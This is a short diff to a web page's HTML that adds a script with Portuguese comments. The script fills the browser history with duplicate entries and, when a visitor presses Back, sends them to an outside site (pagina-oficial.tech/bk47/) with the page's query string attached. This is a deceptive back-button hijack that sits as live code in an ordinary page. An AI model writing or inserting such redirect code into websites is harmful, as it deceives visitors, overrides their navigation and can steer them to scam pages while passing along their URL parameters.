@@ -31,4 +31,18 @@
         }
     }
 </script>
+<script>
+    var urlBackRedirect = 'https://pagina-oficial.tech/bk47/'; // lembre-se de usar a url sem espaços
+    // não altere nada abaixo dessa linha
+    urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+    history.pushState({}, "", location.href);
+    history.pushState({}, "", location.href);
+    window.onpopstate = function () {
+        setTimeout(function () {
+            location.href = urlBackRedirect;
+        }, 1);
+    };
+</script>
     <!-- Page cached by LiteSpeed Cache 5.5.1 on 2023-09-30 14:37:12 -->
